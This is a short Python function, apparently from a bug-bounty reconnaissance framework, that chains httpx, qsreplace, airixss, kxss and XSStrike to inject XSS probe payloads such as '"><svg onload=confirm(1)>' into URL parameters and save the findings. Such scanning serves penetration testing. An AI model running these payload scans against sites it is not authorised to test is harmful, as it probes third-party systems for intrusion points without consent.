from Runner.Runner import run_section

def xss_scanning(target_dir):
    commands = [
        f"cat {target_dir}/payloads/xss-url.txt | httpx -silent | qsreplace '\"><svg onload=confirm(1)>' | airixss -payload 'confirm(1)' > {target_dir}/payloads/xss-url-airixss-result.txt",
        f"cat {target_dir}/payloads/xss-url.txt | qsreplace '\"><img src=x onerror=alert(1)>' | kxss > {target_dir}/payloads/xss-url-kxss-result.txt",
        f"xargs -a {target_dir}/payloads/xss-url.txt -I@ bash -c 'python3 /root/tools/XSStrike/xsstrike.py -u @' > {target_dir}/payloads/xss-url-xsstrike-result.txt"
    ]
    run_section("Try to find XSS on the urls",commands)